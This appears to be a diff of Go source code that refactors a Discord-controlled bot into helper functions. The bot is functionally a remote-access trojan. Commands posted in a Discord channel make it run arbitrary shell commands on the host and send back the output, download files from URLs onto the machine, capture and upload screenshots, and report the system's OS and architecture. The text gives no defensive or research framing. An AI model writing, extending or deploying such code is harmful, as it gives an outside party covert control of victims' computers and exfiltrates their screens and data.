@@ -58,6 +58,44 @@ func main() {
 	return
 }
 
+func cmd_info(s *discordgo.Session,m *discordgo.MessageCreate){
+	_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
+}
+
+func cmd_cmd(s *discordgo.Session,m *discordgo.MessageCreate,comman_items []string){
+	output, _ := exec.Command(comman_items[2],comman_items[3:]...).CombinedOutput()
+	_, _ = s.ChannelMessageSend(m.ChannelID,string(output))
+}
+
+func cmd_download(s *discordgo.Session,m *discordgo.MessageCreate,comman_items []string){
+	if(len(comman_items)>3){
+
+		out, _ := os.Create(comman_items[3])
+		defer out.Close()
+		resp, _ := http.Get(comman_items[2])
+		defer resp.Body.Close()
+		io.Copy(out, resp.Body)
+
+		_, _ = s.ChannelMessageSend(m.ChannelID,"Downloaded")
+
+	}
+}
+
+func cmd_screenshot(s *discordgo.Session,m *discordgo.MessageCreate){
+	img, err := screenshot.CaptureScreen()
+
+	if(err!=nil){
+		_, _ = s.ChannelMessageSend(m.ChannelID,"ERROR")
+	}else{
+		buff := new(bytes.Buffer)
+		png.Encode(buff, img)
+		imgdat := bytes.NewReader(buff.Bytes())
+
+		s.ChannelFileSend(m.ChannelID,"screen.png",imgdat)
+	}
+}
+
+
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	comman_items := strings.Split(m.Content," ")
@@ -75,27 +113,15 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if comman_items[1] == "info" {
-		_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
+		cmd_info(s,m)
 	}
 
 	if comman_items[1] == "cmd" {
-		output, _ := exec.Command(comman_items[2],comman_items[3:]...).CombinedOutput()
-		_, _ = s.ChannelMessageSend(m.ChannelID,string(output))
+		cmd_cmd(s,m,comman_items)
 	}
 
 	if comman_items[1] == "download" {
-
-		if(len(comman_items)>3){
-
-			out, _ := os.Create(comman_items[3])
-			defer out.Close()
-			resp, _ := http.Get(comman_items[2])
-			defer resp.Body.Close()
-			io.Copy(out, resp.Body)
-
-			_, _ = s.ChannelMessageSend(m.ChannelID,"Downloaded")
-
-		}
+		cmd_download(s,m,comman_items)
 	}
 
 	if comman_items[1] == "ver" {
@@ -103,17 +129,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if comman_items[1] == "screenshot" {
-		img, err := screenshot.CaptureScreen()
-
-		if(err!=nil){
-			_, _ = s.ChannelMessageSend(m.ChannelID,"ERROR")
-		}else{
-			buff := new(bytes.Buffer)
-			png.Encode(buff, img)
-			imgdat := bytes.NewReader(buff.Bytes())
-
-			s.ChannelFileSend(m.ChannelID,"screen.png",imgdat)
-		}
+		cmd_screenshot(s,m)
 
 	}
 
